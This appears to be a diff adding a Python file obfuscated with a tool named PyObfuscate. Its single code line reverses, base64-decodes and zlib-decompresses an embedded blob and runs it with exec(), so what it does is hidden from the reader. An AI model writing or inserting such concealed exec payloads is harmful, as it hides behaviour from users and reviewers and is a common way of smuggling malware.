@@ -1,0 +1,5 @@
+# Obfuscated with PyObfuscate
+# https://www.github.com/htr-tech
+# Time : Sat Jul 12 12:27:56 2025
+# -------------------------------
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==QTHfnkP0f/5z/hXMPdggf3EGi9wd0wfkr84XDqgSBUvw8iqmujfpYoJEU6rk5yqgn6RBHBSmsMUl+pv3d3qyRP8ZQ+HskmnXwqNPgPUUGNSYvwgYi5Vi21swBNA6pOXfuiMivhBy/sPLRBosnsr4PuMh7h6UQzJnfb85moWd4NsN6cpPjKRGlo7Fmto/+HIZu1Nreueoz3JjUcM9VfDpELu0ITaQoj0OCYyKlSnEtszZyzYbaRXp28rL3hp1qIJd9sY6G9de3arN/fWcp99lPyNs95MqpYhAsSXUceffcNOSF3tsb2cKnGZUdtXPCP1sCj2MneXyrNgGU+9Ec8ZN9LN3gM7Y30nnhunKd3STCudVf1FbN4sXcgBEMnwqBdpU9RXtu3Clo4PUWBdnqYPpUvUuhq4lrRUW0edRP7kt2iFr3c776V6PbPnox4mfnKgwltVjVRM9VxRI6jZ96VB3IGAe4lN1ygOkhTvkTLKc9L7q/ige03eVCNTl/pZdmYZRcGP02GdIFFlIILk2ZNBMEF6Xb2QyLeLMRHLTO5xhfzBT+fq70dOwIqab9deRbytstoOWHACSICHMw15la/Tu/95n//kwqi7m+0JAhoMCyTTDGRGBSmQmheZSQRP/P9jDMAAAjo2mUwFwJe'))
